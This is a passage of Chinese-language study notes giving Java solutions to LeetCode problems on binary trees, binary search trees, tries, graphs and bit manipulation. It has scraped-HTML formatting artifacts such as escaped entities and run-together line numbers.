isSubtree(TreeNode s, TreeNode t) &#123; if (s == null) return false; return isSubtreeWithRoot(s, t) || isSubtree(s.left, t) || isSubtree(s.right, t);&#125;private boolean isSubtreeWithRoot(TreeNode s, TreeNode t) &#123; if (t == null &amp;&amp; s == null) return true; if (t == null || s == null) return false; if (t.val != s.val) return false; return isSubtreeWithRoot(s.left, t.left) &amp;&amp; isSubtreeWithRoot(s.right, t.right);&#125; 树的对称 101. Symmetric Tree (Easy) 12345 1 / \ 2 2 / \ / \3 4 4 3 1234567891011public boolean isSymmetric(TreeNode root) &#123; if (root == null) return true; return isSymmetric(root.left, root.right);&#125;private boolean isSymmetric(TreeNode t1, TreeNode t2) &#123; if (t1 == null &amp;&amp; t2 == null) return true; if (t1 == null || t2 == null) return false; if (t1.val != t2.val) return false; return isSymmetric(t1.left, t2.right) &amp;&amp; isSymmetric(t1.right, t2.left);&#125; 最小路径 111. Minimum Depth of Binary Tree (Easy) 树的根节点到叶子节点的最小路径长度 1234567public int minDepth(TreeNode root) &#123; if (root == null) return 0; int left = minDepth(root.left); int right = minDepth(root.right); if (left == 0 || right == 0) return left + right + 1; return Math.min(left, right) + 1;&#125; 统计左叶子节点的和 404. Sum of Left Leaves (Easy) 1234567 3 / \ 9 20 / \ 15 7There are two left leaves in the binary tree, with values 9 and 15 respectively. Return 24. 12345678910public int sumOfLeftLeaves(TreeNode root) &#123; if (root == null) return 0; if (isLeaf(root.left)) return root.left.val + sumOfLeftLeaves(root.right); return sumOfLeftLeaves(root.left) + sumOfLeftLeaves(root.right);&#125;private boolean isLeaf(TreeNode node)&#123; if (node == null) return false; return node.left == null &amp;&amp; node.right == null;&#125; 相同节点值的最大路径长度 687. Longest Univalue Path (Easy) 1234567 1 / \ 4 5 / \ \ 4 4 5Output : 2 12345678910111213141516private int path = 0;public int longestUnivaluePath(TreeNode root) &#123; dfs(root); return path;&#125;private int dfs(TreeNode root)&#123; if (root == null) return 0; int left = dfs(root.left); int right = dfs(root.right); int leftPath = root.left != null &amp;&amp; root.left.val == root.val ? left + 1 : 0; int rightPath = root.right != null &amp;&amp; root.right.val == root.val ? right + 1 : 0; path = Math.max(path, leftPath + rightPath); return Math.max(leftPath, rightPath);&#125; 间隔遍历 337. House Robber III (Medium) 123456 3 / \ 2 3 \ \ 3 1Maximum amount of money the thief can rob = 3 + 3 + 1 = 7. 12345678public int rob(TreeNode root) &#123; if (root == null) return 0; int val1 = root.val; if (root.left != null) val1 += rob(root.left.left) + rob(root.left.right); if (root.right != null) val1 += rob(root.right.left) + rob(root.right.right); int val2 = rob(root.left) + rob(root.right); return Math.max(val1, val2);&#125; 找出二叉树中第二小的节点 671. Second Minimum Node In a Binary Tree (Easy) 12345678Input: 2 / \ 2 5 / \ 5 7Output: 5 一个节点要么具有 0 个或 2 个子节点，如果有子节点，那么根节点是最小的节点。 1234567891011public int findSecondMinimumValue(TreeNode root) &#123; if (root == null) return -1; if (root.left == null &amp;&amp; root.right == null) return -1; int leftVal = root.left.val; int rightVal = root.right.val; if (leftVal == root.val) leftVal = findSecondMinimumValue(root.left); if (rightVal == root.val) rightVal = findSecondMinimumValue(root.right); if (leftVal != -1 &amp;&amp; rightVal != -1) return Math.min(leftVal, rightVal); if (leftVal != -1) return leftVal; return rightVal;&#125; 层次遍历使用 BFS 进行层次遍历。不需要使用两个队列来分别存储当前层的节点和下一层的节点，因为在开始遍历一层的节点时，当前队列中的节点数就是当前层的节点数，只要控制遍历这么多节点数，就能保证这次遍历的都是当前层的节点。 一棵树每层节点的平均数 637. Average of Levels in Binary Tree (Easy) 123456789101112131415161718public List&lt;Double&gt; averageOfLevels(TreeNode root) &#123; List&lt;Double&gt; ret = new ArrayList&lt;&gt;(); if (root == null) return ret; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.add(root); while (!queue.isEmpty()) &#123; int cnt = queue.size(); double sum = 0; for (int i = 0; i &lt; cnt; i++) &#123; TreeNode node = queue.poll(); sum += node.val; if (node.left != null) queue.add(node.left); if (node.right != null) queue.add(node.right); &#125; ret.add(sum / cnt); &#125; return ret;&#125; 得到左下角的节点 513. Find Bottom Left Tree Value (Easy) 123456789101112Input: 1 / \ 2 3 / / \ 4 5 6 / 7Output:7 12345678910public int findBottomLeftValue(TreeNode root) &#123; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.add(root); while (!queue.isEmpty()) &#123; root = queue.poll(); if (root.right != null) queue.add(root.right); if (root.left != null) queue.add(root.left); &#125; return root.val;&#125; 前中后序遍历12345 1 / \ 2 3 / \ \4 5 6 层次遍历顺序：[1 2 3 4 5 6] 前序遍历顺序：[1 2 4 5 3 6] 中序遍历顺序：[4 2 5 1 3 6] 后序遍历顺序：[4 5 2 6 3 1] 层次遍历使用 BFS 实现，利用的就是 BFS 一层一层遍历的特性；而前序、中序、后序遍历利用了 DFS 实现。 前序、中序、后序遍只是在对节点访问的顺序有一点不同，其它都相同。 ① 前序 12345void dfs(TreeNode root) &#123; visit(root); dfs(root.left); dfs(root.right);&#125; ② 中序 12345void dfs(TreeNode root) &#123; dfs(root.left); visit(root); dfs(root.right);&#125; ③ 后序 12345void dfs(TreeNode root) &#123; dfs(root.left); dfs(root.right); visit(root);&#125; 非递归实现二叉树的前序遍历 144. Binary Tree Preorder Traversal (Medium) 12345678910111213public List&lt;Integer&gt; preorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); stack.push(root); while (!stack.isEmpty()) &#123; TreeNode node = stack.pop(); if (node == null) continue; ret.add(node.val); stack.push(node.right); // 先右后左，保证左子树先遍历 stack.push(node.left); &#125; return ret;&#125; 非递归实现二叉树的后序遍历 145. Binary Tree Postorder Traversal (Medium) 前序遍历为 root -&gt; left -&gt; right，后序遍历为 left -&gt; right -&gt; root，可以修改前序遍历成为 root -&gt; right -&gt; left，那么这个顺序就和后序遍历正好相反。 1234567891011121314public List&lt;Integer&gt; postorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); stack.push(root); while (!stack.isEmpty()) &#123; TreeNode node = stack.pop(); if (node == null) continue; ret.add(node.val); stack.push(node.left); stack.push(node.right); &#125; Collections.reverse(ret); return ret;&#125; 非递归实现二叉树的中序遍历 94. Binary Tree Inorder Traversal (Medium) 12345678910111213141516public List&lt;Integer&gt; inorderTraversal(TreeNode root) &#123; List&lt;Integer&gt; ret = new ArrayList&lt;&gt;(); if (root == null) return ret; Stack&lt;TreeNode&gt; stack = new Stack&lt;&gt;(); TreeNode cur = root; while (cur != null || !stack.isEmpty()) &#123; while (cur != null) &#123; stack.push(cur); cur = cur.left; &#125; TreeNode node = stack.pop(); ret.add(node.val); cur = node.right; &#125; return ret;&#125; BST二叉查找树（BST）：根节点大于等于左子树所有节点，小于等于右子树所有节点。 二叉查找树中序遍历有序。 修剪二叉查找树 669. Trim a Binary Search Tree (Easy) 1234567891011121314151617181920Input: 3 / \ 0 4 \ 2 / 1 L = 1 R = 3Output: 3 / 2 / 1 题目描述：只保留值在 L ~ R 之间的节点 12345678public TreeNode trimBST(TreeNode root, int L, int R) &#123; if (root == null) return null; if (root.val &gt; R) return trimBST(root.left, L, R); if (root.val &lt; L) return trimBST(root.right, L, R); root.left = trimBST(root.left, L, R); root.right = trimBST(root.right, L, R); return root;&#125; 寻找二叉查找树的第 k 个元素 230. Kth Smallest Element in a BST (Medium) 中序遍历解法： 123456789101112131415161718private int cnt = 0;private int val;public int kthSmallest(TreeNode root, int k) &#123; inOrder(root, k); return val;&#125;private void inOrder(TreeNode node, int k) &#123; if (node == null) return; inOrder(node.left, k); cnt++; if (cnt == k) &#123; val = node.val; return; &#125; inOrder(node.right, k);&#125; 递归解法： 1234567891011public int kthSmallest(TreeNode root, int k) &#123; int leftCnt = count(root.left); if (leftCnt == k - 1) return root.val; if (leftCnt &gt; k - 1) return kthSmallest(root.left, k); return kthSmallest(root.right, k - leftCnt - 1);&#125;private int count(TreeNode node) &#123; if (node == null) return 0; return 1 + count(node.left) + count(node.right);&#125; 把二叉查找树每个节点的值都加上比它大的节点的值 Convert BST to Greater Tree (Easy) 1234567891011Input: The root of a Binary Search Tree like this: 5 / \ 2 13Output: The root of a Greater Tree like this: 18 / \ 20 13 先遍历右子树。 1234567891011121314private int sum = 0;public TreeNode convertBST(TreeNode root) &#123; traver(root); return root;&#125;private void traver(TreeNode node) &#123; if (node == null) return; traver(node.right); sum += node.val; node.val = sum; traver(node.left);&#125; 二叉查找树的最近公共祖先 235. Lowest Common Ancestor of a Binary Search Tree (Easy) 123456789 _______6______ / \ ___2__ ___8__ / \ / \0 4 7 9 / \ 3 5For example, the lowest common ancestor (LCA) of nodes 2 and 8 is 6. Another example is LCA of nodes 2 and 4 is 2, since a node can be a descendant of itself according to the LCA definition. 12345public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123; if (root.val &gt; p.val &amp;&amp; root.val &gt; q.val) return lowestCommonAncestor(root.left, p, q); if (root.val &lt; p.val &amp;&amp; root.val &lt; q.val) return lowestCommonAncestor(root.right, p, q); return root;&#125; 二叉树的最近公共祖先 236. Lowest Common Ancestor of a Binary Tree (Medium) 123456789 _______3______ / \ ___5__ ___1__ / \ / \6 2 0 8 / \ 7 4For example, the lowest common ancestor (LCA) of nodes 5 and 1 is 3. Another example is LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition. 123456public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) &#123; if (root == null || root == p || root == q) return root; TreeNode left = lowestCommonAncestor(root.left, p, q); TreeNode right = lowestCommonAncestor(root.right, p, q); return left == null ? right : right == null ? left : root;&#125; 从有序数组中构造二叉查找树 108. Convert Sorted Array to Binary Search Tree (Easy) 123456789101112public TreeNode sortedArrayToBST(int[] nums) &#123; return toBST(nums, 0, nums.length - 1);&#125;private TreeNode toBST(int[] nums, int sIdx, int eIdx)&#123; if (sIdx &gt; eIdx) return null; int mIdx = (sIdx + eIdx) / 2; TreeNode root = new TreeNode(nums[mIdx]); root.left = toBST(nums, sIdx, mIdx - 1); root.right = toBST(nums, mIdx + 1, eIdx); return root;&#125; 根据有序链表构造平衡的二叉查找树 109. Convert Sorted List to Binary Search Tree (Medium) 123456789Given the sorted linked list: [-10,-3,0,5,9],One possible answer is: [0,-3,9,-10,null,5], which represents the following height balanced BST: 0 / \ -3 9 / / -10 5 12345678910111213141516171819202122public TreeNode sortedListToBST(ListNode head) &#123; if (head == null) return null; if (head.next == null) return new TreeNode(head.val); ListNode preMid = preMid(head); ListNode mid = preMid.next; preMid.next = null; // 断开链表 TreeNode t = new TreeNode(mid.val); t.left = sortedListToBST(head); t.right = sortedListToBST(mid.next); return t;&#125;private ListNode preMid(ListNode head) &#123; ListNode slow = head, fast = head.next; ListNode pre = head; while (fast != null &amp;&amp; fast.next != null) &#123; pre = slow; slow = slow.next; fast = fast.next.next; &#125; return pre;&#125; 在二叉查找树中寻找两个节点，使它们的和为一个给定值 653. Two Sum IV - Input is a BST (Easy) 1234567891011Input: 5 / \ 3 6 / \ \2 4 7Target = 9Output: True 使用中序遍历得到有序数组之后，再利用双指针对数组进行查找。 应该注意到，这一题不能用分别在左右子树两部分来处理这种思想，因为两个待求的节点可能分别在左右子树中。 12345678910111213141516171819public boolean findTarget(TreeNode root, int k) &#123; List&lt;Integer&gt; nums = new ArrayList&lt;&gt;(); inOrder(root, nums); int i = 0, j = nums.size() - 1; while (i &lt; j) &#123; int sum = nums.get(i) + nums.get(j); if (sum == k) return true; if (sum &lt; k) i++; else j--; &#125; return false;&#125;private void inOrder(TreeNode root, List&lt;Integer&gt; nums) &#123; if (root == null) return; inOrder(root.left, nums); nums.add(root.val); inOrder(root.right, nums);&#125; 在二叉查找树中查找两个节点之差的最小绝对值 530. Minimum Absolute Difference in BST (Easy) 1234567891011Input: 1 \ 3 / 2Output:1 利用二叉查找树的中序遍历为有序的性质，计算中序遍历中临近的两个节点之差的绝对值，取最小值。 123456789101112131415private int minDiff = Integer.MAX_VALUE;private TreeNode preNode = null;public int getMinimumDifference(TreeNode root) &#123; inOrder(root); return minDiff;&#125;private void inOrder(TreeNode node) &#123; if (node == null) return; inOrder(node.left); if (preNode != null) minDiff = Math.min(minDiff, node.val - preNode.val); preNode = node; inOrder(node.right);&#125; 寻找二叉查找树中出现次数最多的值 501. Find Mode in Binary Search Tree (Easy) 1234567 1 \ 2 / 2return [2]. 答案可能不止一个，也就是有多个值出现的次数一样多，并且是最大的。 1234567891011121314151617181920212223242526272829303132private int curCnt = 1;private int maxCnt = 1;private TreeNode preNode = null;public int[] findMode(TreeNode root) &#123; List&lt;Integer&gt; maxCntNums = new ArrayList&lt;&gt;(); inOrder(root, maxCntNums); int[] ret = new int[maxCntNums.size()]; int idx = 0; for (int num : maxCntNums) &#123; ret[idx++] = num; &#125; return ret;&#125;private void inOrder(TreeNode node, List&lt;Integer&gt; nums) &#123; if (node == null) return; inOrder(node.left, nums); if (preNode != null) &#123; if (preNode.val == node.val) curCnt++; else curCnt = 1; &#125; if (curCnt &gt; maxCnt) &#123; maxCnt = curCnt; nums.clear(); nums.add(node.val); &#125; else if (curCnt == maxCnt) &#123; nums.add(node.val); &#125; preNode = node; inOrder(node.right, nums);&#125; Trie Trie，又称前缀树或字典树，用于判断字符串是否存在或者是否具有某种字符串前缀。 实现一个 Trie 208. Implement Trie (Prefix Tree) (Medium) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class Trie &#123; private class Node &#123; Node[] childs = new Node[26]; boolean isLeaf; &#125; private Node root = new Node(); public Trie() &#123; &#125; public void insert(String word) &#123; insert(word, root); &#125; private void insert(String word, Node node) &#123; if (node == null) return; if (word.length() == 0) &#123; node.isLeaf = true; return; &#125; int index = indexForChar(word.charAt(0)); if (node.childs[index] == null) &#123; node.childs[index] = new Node(); &#125; insert(word.substring(1), node.childs[index]); &#125; public boolean search(String word) &#123; return search(word, root); &#125; private boolean search(String word, Node node) &#123; if (node == null) return false; if (word.length() == 0) return node.isLeaf; int index = indexForChar(word.charAt(0)); return search(word.substring(1), node.childs[index]); &#125; public boolean startsWith(String prefix) &#123; return startWith(prefix, root); &#125; private boolean startWith(String prefix, Node node) &#123; if (node == null) return false; if (prefix.length() == 0) return true; int index = indexForChar(prefix.charAt(0)); return startWith(prefix.substring(1), node.childs[index]); &#125; private int indexForChar(char c) &#123; return c - 'a'; &#125;&#125; 实现一个 Trie，用来求前缀和 677. Map Sum Pairs (Medium) 1234Input: insert("apple", 3), Output: NullInput: sum("ap"), Output: 3Input: insert("app", 2), Output: NullInput: sum("ap"), Output: 5 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051class MapSum &#123; private class Node &#123; Node[] child = new Node[26]; int value; &#125; private Node root = new Node(); public MapSum() &#123; &#125; public void insert(String key, int val) &#123; insert(key, root, val); &#125; private void insert(String key, Node node, int val) &#123; if (node == null) return; if (key.length() == 0) &#123; node.value = val; return; &#125; int index = indexForChar(key.charAt(0)); if (node.child[index] == null) &#123; node.child[index] = new Node(); &#125; insert(key.substring(1), node.child[index], val); &#125; public int sum(String prefix) &#123; return sum(prefix, root); &#125; private int sum(String prefix, Node node) &#123; if (node == null) return 0; if (prefix.length() != 0) &#123; int index = indexForChar(prefix.charAt(0)); return sum(prefix.substring(1), node.child[index]); &#125; int sum = node.value; for (Node child : node.child) &#123; sum += sum(prefix, child); &#125; return sum; &#125; private int indexForChar(char c) &#123; return c - 'a'; &#125;&#125; 图二分图如果可以用两种颜色对图中的节点进行着色，并且保证相邻的节点颜色不同，那么这个图就是二分图。 判断是否为二分图 785. Is Graph Bipartite? (Medium) 123456789Input: [[1,3], [0,2], [1,3], [0,2]]Output: trueExplanation:The graph looks like this:0----1| || |3----2We can divide the vertices into two groups: &#123;0, 2&#125; and &#123;1, 3&#125;. 12345678910Example 2:Input: [[1,2,3], [0,2], [0,1,3], [0,2]]Output: falseExplanation:The graph looks like this:0----1| \ || \ |3----2We cannot find a way to divide the set of nodes into two independent subsets. 1234567891011121314151617181920212223public boolean isBipartite(int[][] graph) &#123; int[] colors = new int[graph.length]; Arrays.fill(colors, -1); for (int i = 0; i &lt; graph.length; i++) &#123; // 处理图不是连通的情况 if (colors[i] == -1 &amp;&amp; !isBipartite(i, 0, colors, graph)) &#123; return false; &#125; &#125; return true;&#125;private boolean isBipartite(int curNode, int curColor, int[] colors, int[][] graph) &#123; if (colors[curNode] != -1) &#123; return colors[curNode] == curColor; &#125; colors[curNode] = curColor; for (int nextNode : graph[curNode]) &#123; if (!isBipartite(nextNode, 1 - curColor, colors, graph)) &#123; return false; &#125; &#125; return true;&#125; 拓扑排序常用于在具有先序关系的任务规划中。 课程安排的合法性 207. Course Schedule (Medium) 122, [[1,0]]return true 122, [[1,0],[0,1]]return false 题目描述：一个课程可能会先修课程，判断给定的先修课程规定是否合法。 本题不需要使用拓扑排序，只需要检测有向图是否存在环即可。 12345678910111213141516171819202122232425262728293031323334353637public boolean canFinish(int numCourses, int[][] prerequisites) &#123; List&lt;Integer&gt;[] graphic = new List[numCourses]; for (int i = 0; i &lt; numCourses; i++) &#123; graphic[i] = new ArrayList&lt;&gt;(); &#125; for (int[] pre : prerequisites) &#123; graphic[pre[0]].add(pre[1]); &#125; boolean[] globalMarked = new boolean[numCourses]; boolean[] localMarked = new boolean[numCourses]; for (int i = 0; i &lt; numCourses; i++) &#123; if (hasCycle(globalMarked, localMarked, graphic, i)) &#123; return false; &#125; &#125; return true;&#125;private boolean hasCycle(boolean[] globalMarked, boolean[] localMarked, List&lt;Integer&gt;[] graphic, int curNode) &#123; if (localMarked[curNode]) &#123; return true; &#125; if (globalMarked[curNode]) &#123; return false; &#125; globalMarked[curNode] = true; localMarked[curNode] = true; for (int nextNode : graphic[curNode]) &#123; if (hasCycle(globalMarked, localMarked, graphic, nextNode)) &#123; return true; &#125; &#125; localMarked[curNode] = false; return false;&#125; 课程安排的顺序 210. Course Schedule II (Medium) 124, [[1,0],[2,0],[3,1],[3,2]]There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is[0,2,1,3]. 使用 DFS 来实现拓扑排序，使用一个栈存储后序遍历结果，这个栈的逆序结果就是拓扑排序结果。 证明：对于任何先序关系：v-&gt;w，后序遍历结果可以保证 w 先进入栈中，因此栈的逆序结果中 v 会在 w 之前。 12345678910111213141516171819202122232425262728293031323334353637383940414243public int[] findOrder(int numCourses, int[][] prerequisites) &#123; List&lt;Integer&gt;[] graphic = new List[numCourses]; for (int i = 0; i &lt; numCourses; i++) &#123; graphic[i] = new ArrayList&lt;&gt;(); &#125; for (int[] pre : prerequisites) &#123; graphic[pre[0]].add(pre[1]); &#125; Stack&lt;Integer&gt; postOrder = new Stack&lt;&gt;(); boolean[] globalMarked = new boolean[numCourses]; boolean[] localMarked = new boolean[numCourses]; for (int i = 0; i &lt; numCourses; i++) &#123; if (hasCycle(globalMarked, localMarked, graphic, i, postOrder)) &#123; return new int[0]; &#125; &#125; int[] orders = new int[numCourses]; for (int i = numCourses - 1; i &gt;= 0; i--) &#123; orders[i] = postOrder.pop(); &#125; return orders;&#125;private boolean hasCycle(boolean[] globalMarked, boolean[] localMarked, List&lt;Integer&gt;[] graphic, int curNode, Stack&lt;Integer&gt; postOrder) &#123; if (localMarked[curNode]) &#123; return true; &#125; if (globalMarked[curNode]) &#123; return false; &#125; globalMarked[curNode] = true; localMarked[curNode] = true; for (int nextNode : graphic[curNode]) &#123; if (hasCycle(globalMarked, localMarked, graphic, nextNode, postOrder)) &#123; return true; &#125; &#125; localMarked[curNode] = false; postOrder.push(curNode); return false;&#125; 并查集并查集可以动态地连通两个点，并且可以非常快速地判断两个点是否连通。 冗余连接 684. Redundant Connection (Medium) 123456Input: [[1,2], [1,3], [2,3]]Output: [2,3]Explanation: The given undirected graph will be like this: 1 / \2 - 3 题目描述：有一系列的边连成的图，找出一条边，移除它之后该图能够成为一棵树。 1234567891011121314151617181920212223242526272829303132333435363738394041424344public int[] findRedundantConnection(int[][] edges) &#123; int N = edges.length; UF uf = new UF(N); for (int[] e : edges) &#123; int u = e[0], v = e[1]; if (uf.connect(u, v)) &#123; return e; &#125; uf.union(u, v); &#125; return new int[]&#123;-1, -1&#125;;&#125;private class UF &#123; private int[] id; UF(int N) &#123; id = new int[N + 1]; for (int i = 0; i &lt; id.length; i++) &#123; id[i] = i; &#125; &#125; void union(int u, int v) &#123; int uID = find(u); int vID = find(v); if (uID == vID) &#123; return; &#125; for (int i = 0; i &lt; id.length; i++) &#123; if (id[i] == uID) &#123; id[i] = vID; &#125; &#125; &#125; int find(int p) &#123; return id[p]; &#125; boolean connect(int u, int v) &#123; return find(u) == find(v); &#125;&#125; 位运算1. 基本原理 0s 表示一串 0，1s 表示一串 1。 123x ^ 0s = x x &amp; 0s = 0 x | 0s = xx ^ 1s = ~x x &amp; 1s = x x | 1s = 1sx ^ x = 0 x &amp; x = x x | x = x 利用 x 1s = ~x 的特点，可以将位级表示翻转；利用 x x = 0 的特点，可以将三个数中重复的两个数去除，只留下另一个数。 利用 x &amp; 0s = 0 和 x &amp; 1s = x 的特点，可以实现掩码操作。一个数 num 与 mask ：00111100 进行位与操作，只保留 num 中与 mask 的 1 部分相对应的位。 利用 x | 0s = x 和 x | 1s = 1s 的特点，可以实现设值操作。一个数 num 与 mask：00111100 进行位或操作，将 num 中与 mask 的 1 部分相对应的位都设置为 1。 位与运算技巧： n&amp;(n-1) 去除 n 的位级表示中最低的那一位。例如对于二进制表示 10110 100 ，减去 1 得到 10110011，这两个数相与得到 10110000。 n&amp;(-n) 得到 n 的位级表示中最低的那一位。-n 得到 n 的反码加 1，对于二进制表示 10110 100 ，-n 得到 01001100，相与得到 00000100。 n-n&amp;(~n+1) 去除 n 的位级表示中最高的那一位。 移位运算： >> n 为算术右移，相当于除以 2n； >>> n 为无符号右移，左边会补上 0。 &lt;&lt; n 为算术左移，相当于乘以 2n。 2. mask 计算 要获取 111111111，将 0 取反即可，~0。 要得到只有第 i 位为 1 的 mask，将 1 向左移动 i-1 位即可，1&lt;&lt;(i-1) 。例如 1&lt;&lt;4 得到只有第 5 位为 1 的 mask ：00010000。 要得到 1 到 i 位为 1 的 mask，1&lt;&lt;(i+1)-1 即可，例如将 1&lt;&lt;(4+1)-1 = 00010000-1 = 00001111。 要得到 1 到 i 位为 0 的 mask，只需将 1 到 i 位为 1 的 mask 取反，即 ~(1&lt;&lt;(i+1)-1)。 3. Java 中的位操作 123static int Integer.bitCount(); // 统计 1 的数量static int Integer.highestOneBit(); // 获得最高位static String toBinaryString(int i); // 转换为二进制表示的字符串 统计两个数的二进制表示有多少位不同 461. Hamming Distance (Easy) 12345678910Input: x = 1, y = 4Output: 2Explanation:1 (0 0 0 1)4 (0 1 0 0) ↑ ↑The above arrows point to positions where the corresponding bits are different. 对两个数进行异或操作，位级表示不同的那一位为 1，统计有多少个 1 即可。 123456789public int hammingDistance(int x, int y) &#123; int z = x ^ y; int cnt = 0; while(z != 0) &#123; if ((z &amp; 1) == 1) cnt++; z = z &gt;&gt; 1; &#125; return cnt;&#125; 使用 z&amp;(z-1) 去除 z 位级表示最低的那一位。 123456789public int hammingDistance(int x, int y) &#123; int z = x ^ y; int cnt = 0; while (z != 0) &#123; z &amp;= (z - 1); cnt++; &#125; return cnt;&#125; 可以使用 Integer.bitcount() 来统计 1 个的个数。 123public int hammingDistance(int x, int y) &#123; return Integer.bitCount(x ^ y);&#125; 数组中唯一一个不重复的元素 136. Single Number (Easy) 12Input: [4,1,2,1,2]Output: 4 两个相同的数异或的结果为 0，对所有数进行异或操作，最后的结果就是单独出现的那个数。 12345public int singleNumber(int[] nums) &#123; int ret = 0; for (int n : nums) ret = ret ^ n; return ret;&#125; 找出数组中缺失的那个数 268. Missing Number (Easy) 12Input: [3,0,1]Output: 2 题目描述：数组元素在 0-n 之间，但是有一个数是缺失的，要求找到这个缺失的数。 1234567public int missingNumber(int[] nums) &#123; int ret = 0; for (int i = 0; i &lt; nums.length; i++) &#123; ret = ret &lt;sup&gt; i &lt;/sup&gt; nums[i]; &#125; return ret ^ nums.length;&#125; 数组中不重复的两个元素 260. Single Number III (Medium) 两个不相等的元素在位级表示上必定会有一位存在不同。 将数组的所有元素异或得到的结果为不存在重复的两个元素异或的结果。 diff &amp;= -diff 得到出 diff 最右侧不为 0 的位，也就是不存在重复的两个元素在位级表示上最右侧不同的那一位，利用这一位就可以将两个元素区分开来。 1234567891011public int[] singleNumber(int[] nums) &#123; int diff = 0; for (int num : nums) diff ^= num; diff &amp;= -diff; // 得到最右一位 int[] ret = new int[2]; for (int num : nums) &#123; if ((num &amp; diff) == 0) ret[0] ^= num; else ret[1] ^= num; &#125; return ret;&#125; 翻转一个数的比特位 190. Reverse Bits (Easy) 123456789public int reverseBits(int n) &#123; int ret = 0; for (int i = 0; i &lt; 32; i++) &#123; ret &lt;&lt;= 1; ret |= (n &amp; 1); n &gt;&gt;&gt;= 1; &#125; return ret;&#125; 如果该函数需要被调用很多次，可以将 int 拆成 4 个 byte，然后缓存 byte 对应的比特位翻转，最后再拼接起来。 123456789101112131415161718192021222324private static Map&lt;Byte, Integer&gt; cache = new HashMap&lt;&gt;();public int reverseBits(int n) &#123; int ret = 0; for (int i = 0; i &lt; 4; i++) &#123; ret &lt;&lt;= 8; ret |= reverseByte((byte) (n &amp; 0b11111111)); n &gt;&gt;= 8; &#125; return ret;&#125;private int reverseByte(byte b) &#123; if (cache.containsKey(b)) return cache.get(b); int ret = 0; byte t = b; for (int i = 0; i &lt; 8; i++) &#123; ret &lt;&lt;= 1; ret |= t &amp; 1; t &gt;&gt;= 1; &#125; cache.put(b, ret); return ret;&#125; 不用额外变量交换两个整数 程序员代码面试指南 ：P317 123a = a ^ b;b = a ^ b;a = a ^ b; 判断一个数是不是 2 的 n 次方 231. Power of Two (Easy) 二进制表示只有一个 1 存在。 123public boolean isPowerOfTwo(int n) &#123; return n &gt; 0 &amp;&amp; Integer.bitCount(n) == 1;&#125; 利用 1000 &amp; 0111 == 0 这种性质，得到以下解法： 123public boolean isPowerOfTwo(int n) &#123; return n &gt; 0 &amp;&amp; (n &amp; (n - 1)) == 0;&#125; 判断一个数是不是 4 的 n 次方 342. Power of Four (Easy) 这种数在二进制表示中有且只有一个奇数位为 1，例如 16（10000）。 123public boolean isPowerOfFour(int num) &#123; return num &gt; 0 &amp;&amp; (num &amp; (num - 1)) == 0 &amp;&amp; (num &amp; 0b01010101010101010101010101010101) != 0;&#125; 也可以使用正则表达式进行匹配。 123public boolean isPowerOfFour(int num) &#123; return Integer.toString(num, 4).matches("10*");&#125; 判断一个数的位级表示是否不会出现连续的 0 和 1 693. Binary Number with Alternating Bits (Easy) 123456789Input: 10Output: TrueExplanation:The binary representation of 10 is: 1010.Input: 11Output: FalseExplanation:The binary representation of 11 is: 1011. 对于 1010 这种位级表示的数，把它向右移动 1 位得到 101，这两个数每个位都不同，因此异或得到的结果为 1111。 1234public boolean hasAlternatingBits(int n) &#123; int a = (n ^ (n &gt;&gt; 1)); return (a &amp; (a + 1)) == 0;&#125; 求一个数的补码 476. Number Complement (Easy) 123Input: 5Output: 2Explanation: The binary representation of 5 is 101 (no leading zero bits), and its complement is 010. So you need to output 2. 题目描述：不考虑二进制表示中的首 0 部分。 对于 00000101，要求补码可以将它与 00000111 进行异或操作。那么问题就转换为求掩码 00000111。 1234567public int findComplement(int num) &#123; if (num == 0) return 1; int mask = 1 &lt;&lt; 30; while ((num &amp; mask) == 0) mask &gt;&gt;= 1; mask = (mask &lt;&lt; 1) - 1; return num ^ mask;&#125; 可以利用 Java 的 Integer.highestOneBit() 方法来获得含有首 1 的数。 123456public int findComplement(int num) &#123; if (num == 0) return 1; int mask = Integer.highestOneBit(num); mask = (mask &lt;&lt; 1) - 1; return num ^ mask;&#125; 对于 10000000 这样的数要扩展成 11111111，可以利用以下方法： 123mask |= mask &gt;&gt; 1 11000000mask |= mask &gt;&gt; 2 11110000mask |= mask &gt;&gt; 4 11111111 123456789public int findComplement(int num) &#123; int mask = num; mask |= mask &gt;&gt; 1; mask |= mask &gt;&gt; 2; mask |= mask &gt;&gt; 4; mask |= mask &gt;&gt; 8; mask |= mask &gt;&gt; 16; return (mask ^ num);&#125; 实现整数的加法 371. Sum of Two Integers (Easy) a ^ b 表示没有考虑进位的情况下两数的和，(a &amp; b) &lt;&lt; 1 就是进位。 递归会终止的原因是 (a &amp; b) &lt;&lt; 1 最右边会多一个 0，那么继续递归，进位最右边的 0 会慢慢增多，最后进位会变为 0，递归终止。 123public int getSum(int a, int b) &#123; return b == 0 ? a : getSum((a ^ b), (a &amp; b) &lt;&lt; 1);&#125; 字符串数组最大乘积 318. Maximum Product of Word Lengths (Medium) 123Given ["abcw", "baz", "foo", "bar", "xtfn", "abcdef"]Return 16The two words can be "abcw", "xtfn". 题目描述：字符串数组的字符串只含有小写字符。求解字符串数组中两个字符串长度的最大乘积，要求这两个字符串不能含有相同字符。 本题主要问题是判断两个字符串是否含相同字符，由于字符串只含有小写字符，总共 26 位，因此可以用一个 32 位的整数来存储每个字符是否出现过。 123456789101112131415161718public int maxProduct(String[] words) &#123; int n = words.length; int[] val = new int[n]; for (int i = 0; i &lt; n; i++) &#123; for (char c : words[i].toCharArray()) &#123; val[i] |= 1 &lt;&lt; (c - 'a'); &#125; &#125; int ret = 0; for (int i = 0; i &lt; n; i++) &#123; for (int j = i + 1; j &lt; n; 